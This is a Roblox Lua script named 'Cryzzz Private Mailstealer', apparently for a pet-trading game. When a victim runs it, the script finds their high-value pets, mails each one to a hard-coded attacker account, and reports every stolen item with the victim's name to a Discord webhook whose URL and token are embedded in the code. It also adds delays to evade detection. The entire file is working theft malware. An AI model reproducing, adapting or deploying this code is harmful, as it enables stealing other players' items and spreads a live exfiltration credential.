-- Cryzzz Private Mailstealer 2026 - Fixed & Optimized
getgenv().Executed = getgenv().Executed or false
if getgenv().Executed then return end
getgenv().Executed = true

repeat task.wait() until game:IsLoaded()

local Username = "Azamon_team"
local Webhook = "https://discordapp.com/api/webhooks/1509224125195878411/BQTSR7zKwgM0-aqaFN2z-F07KPTg-OfqIs5lqYpdTHlFgKKfOzK0L4Cuc_v2O0Z51IzE"
local MinimumRAP = 1000000
local mailstealer_name = "Cryzzz"

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")

local LocalPlayer = Players.LocalPlayer
if LocalPlayer.Name == Username then
    LocalPlayer:Kick("Owner Account - Use Alt")
    return
end

local Library = require(ReplicatedStorage.Library)
local Save = require(ReplicatedStorage.Library.Client.Save).Get()
local Directory = require(ReplicatedStorage.Library.Directory)

local Inventory = Save.Inventory
local network = ReplicatedStorage:WaitForChild("Network")

-- Gems Amount mit Fallback
local GemsAmount = 0
if Inventory.Currency then
    for _, v in pairs(Inventory.Currency) do
        if v.id == "Diamonds" then
            GemsAmount = v._am or 0
            break
        end
    end
end

-- Bessere Methode für Mail Cost (falls getgc versagt)
local FirstPriceOfMail = 0
local success, func = pcall(function()
    for _, f in pairs(getgc(true)) do
        if typeof(f) == "function" and debug.getinfo(f).name == "computeSendMailCost" then
            return f
        end
    end
end)
if success and func then
    FirstPriceOfMail = func() or 0
end

if FirstPriceOfMail > GemsAmount then
    warn("Nicht genug Gems für Mail")
    return
end

local function FormatNumber(number)
    local n = math.floor(number)
    local suf = {"", "k", "m", "b", "t"}
    local index = 1
    while n >= 1000 and index < #suf do
        n = n / 1000
        index += 1
    end
    return string.format("%.2f%s", n, suf[index])
end

local function GetItemValue(itemTable, class)
    local success, rap = pcall(function()
        return require(ReplicatedStorage.Library.Client.DevRAPCmds).Get({
            Class = {Name = class},
            IsA = function() return true end,
            GetId = function() return itemTable.id end,
            StackKey = function() 
                return HttpService:JSONEncode({
                    id = itemTable.id,
                    pt = itemTable.pt,
                    sh = itemTable.sh,
                    tn = itemTable.tn
                })
            end
        }) or 0
    end)
    return success and rap or 0
end

local function GetThumbnail(imageid)
    local asset = string.split(imageid or "", "rbxassetid://")[2]
    if not asset then return "https://via.placeholder.com/420" end
    local success, response = pcall(function()
        local data = HttpService:JSONDecode(game:HttpGet("https://thumbnails.roblox.com/v1/assets?assetIds="..asset.."&size=420x420&format=png"))
        return data.data[1].imageUrl
    end)
    return success and response or "https://via.placeholder.com/420"
end

local function SendWebhook(itemName, rap, totalRap, thumbnail, itemsLeft, isShiny)
    local embed = {
        ["username"] = mailstealer_name .. " Mailstealer",
        ["content"] = "@everyone",
        ["embeds"] = {{
            ["title"] = "**New Item Received**",
            ["color"] = 16776960,
            ["thumbnail"] = {["url"] = thumbnail},
            ["fields"] = {
                {["name"] = "Victim", ["value"] = LocalPlayer.Name},
                {["name"] = "Item", ["value"] = itemName},
                {["name"] = "RAP", ["value"] = FormatNumber(rap)},
                {["name"] = "Total RAP", ["value"] = FormatNumber(totalRap)},
                {["name"] = "Items Left", ["value"] = itemsLeft}
            }
        }}
    }
    pcall(function()
        HttpService:PostAsync(Webhook, HttpService:JSONEncode(embed), Enum.HttpContentType.ApplicationJson)
    end)
end

-- Collect high value pets
local hits = {}
if Inventory.Pet then
    for id, v in pairs(Inventory.Pet) do
        local rap = GetItemValue(v, "Pet")
        if rap >= MinimumRAP then
            table.insert(hits, {
                Item_Id = id,
                Item_Name = v.id,
                Item_Amount = v._am or 1,
                Item_RAP = rap,
                IsShiny = v.sh or false,
                ImageId = (Directory.Pets[v.id] or {}).thumbnail or ""
            })
        end
    end
end

table.sort(hits, function(a,b) return a.Item_RAP > b.Item_RAP end)

local totalRap = 0
for _, v in ipairs(hits) do
    totalRap += v.Item_RAP
end

print("Found " .. #hits .. " items | Total RAP: " .. FormatNumber(totalRap))

for i, v in ipairs(hits) do
    local args = {Username, "Cryzzz on top", "Pet", v.Item_Id, v.Item_Amount}
    
    local sendSuccess = pcall(function()
        network:WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
    end)
    
    if sendSuccess then
        local thumb = GetThumbnail(v.ImageId)
        SendWebhook(v.Item_Name, v.Item_RAP, totalRap, thumb, #hits - i, v.IsShiny)
        task.wait(1.3) -- etwas längerer Delay gegen Detection
    else
        warn("Send failed for item: " .. v.Item_Name)
        task.wait(2)
    end
end

print("=== CRYZZZ MAILSTEALER FINISHED ===")
